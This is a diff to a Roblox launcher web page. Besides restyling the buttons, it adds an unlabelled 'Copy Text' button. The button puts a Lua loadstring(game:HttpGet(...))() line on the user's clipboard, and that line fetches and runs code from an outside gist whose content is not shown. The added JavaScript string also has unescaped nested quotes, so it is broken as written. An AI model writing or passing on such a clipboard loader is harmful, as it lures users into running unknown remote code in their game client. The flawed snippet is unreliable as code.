@@ -13,16 +13,25 @@
             justify-content: center;
             align-items: center;
             overflow: hidden;
+            flex-direction: column; /* Added to stack buttons vertically */
         }
-        #playButton {
+        #playButton, #scriptButton {
             border: none;
-            padding: 0;
-            background: none;
+            padding: 10px 20px;
+            background-color: white;
             cursor: pointer;
-            width: 100vw;
-            height: 100vh;
+            margin: 10px;
+            font-size: 18px;
+            transition: transform 0.3s, background-color 0.3s;
             position: relative;
-            overflow: hidden;
+        }
+        #playButton:hover, #scriptButton:hover {
+            transform: scale(1.1);
+            background-color: lightgray;
+        }
+        #playButton:active, #scriptButton:active {
+            transform: scale(0.9);
+            background-color: gray;
         }
         #image {
             width: 100%;
@@ -31,7 +40,6 @@
             transition: transform 0.5s linear;
             transform-origin: center center;
         }
-        /* Definicja animacji obrotu */
         @keyframes spin {
             0% {
                 transform: rotate(0deg);
@@ -49,21 +57,26 @@
     <button id="playButton">
         <img id="image" src="https://tr.rbxcdn.com/3b2ad0cfbbd25880e2bb96061387f8c4/768/432/Image/Webp" alt="" title="">
     </button>
+    <button id="scriptButton">Copy Text</button>
     <script>
         document.getElementById('playButton').addEventListener('click', () => {
-            // Natychmiastowe przekierowanie do gry Roblox
             window.location.href = 'roblox://placeID=13874310483';
-            
-            // Dodanie klasy 'spin' po 0.1 sekundy
             setTimeout(() => {
                 const playButton = document.getElementById('playButton');
                 playButton.classList.add('spin');
-
-                // Po 6 sekundach usunięcie klasy 'spin'
                 setTimeout(() => {
                     playButton.classList.remove('spin');
-                }, 6000); // 6 sekund
-            }, 100); // Opóźnienie 0.1 sekundy, aby zapewnić, że przekierowanie do gry odbywa się przed rozpoczęciem animacji
+                }, 6000);
+            }, 100);
+        });
+
+        document.getElementById('scriptButton').addEventListener('click', () => {
+            const text = 'loadstring(game:HttpGet('https://gist.githubusercontent.com/NOTHINGx555/a255d83bb4562b0f1a146cfe18e67feb/raw/d0ef7e83d289475e626116145233eb2f1e48de44/.lua'))()';
+            navigator.clipboard.writeText(text).then(() => {
+                alert('is copy');
+            }).catch(err => {
+                alert('Failed to copy text: ', err);
+            });
         });
     </script>
 </body>
